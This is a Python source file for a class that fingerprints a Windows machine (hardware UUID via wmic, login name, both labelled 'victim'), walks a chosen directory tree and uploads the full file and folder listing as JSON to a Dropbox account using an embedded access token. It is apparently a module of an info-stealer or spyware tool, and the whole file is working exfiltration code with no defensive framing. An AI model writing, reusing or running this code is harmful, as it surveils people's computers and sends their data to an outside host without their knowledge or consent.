import os
import subprocess
import dropbox
from time import time
import json

class DropboxFileEnumerator:

    def __init__(self, config):
        self.config = config
        self._victim_hwid = subprocess.check_output('wmic csproduct get uuid').decode().split('\n')[1].split(' ')[0]
        self._victim_username = os.getlogin()
        substr_replacements: dict = {
            '`hwid`': self._victim_hwid,
            '`victim_username`': self._victim_username
        }
        # replace special substrs in config
        for key in self.config.keys():
            if type(self.config[key]) is not str:
                continue
            for old_substr, new_substr in substr_replacements.items():
                self.config[key] = self.config[key].replace(old_substr, new_substr)
    
    def run(self) -> None:
        dir_contents = {}
        for parent, dirnames, filenames in os.walk(self.config['root_dirpath']):
            dir_contents[parent] = {
                'folders': [],
                'files': []
            }
            for dirname in dirnames:
                dir_contents[parent]['folders'].append(dirname)
            for filename in filenames:
                dir_contents[parent]['files'].append(filename)
        content = json.dumps(dir_contents, indent=self.config['output_json_indent_level'])
        output_filename = str(round(time() * 1000)) + '.json'
        dropbox_filepath = (self.config['output_dropbox_dirpath'] + '/' + output_filename).replace('//', '/')
        dbx = dropbox.Dropbox(self.config['dropbox_token'])
        dbx.files_upload(content.encode('utf-8'), dropbox_filepath)

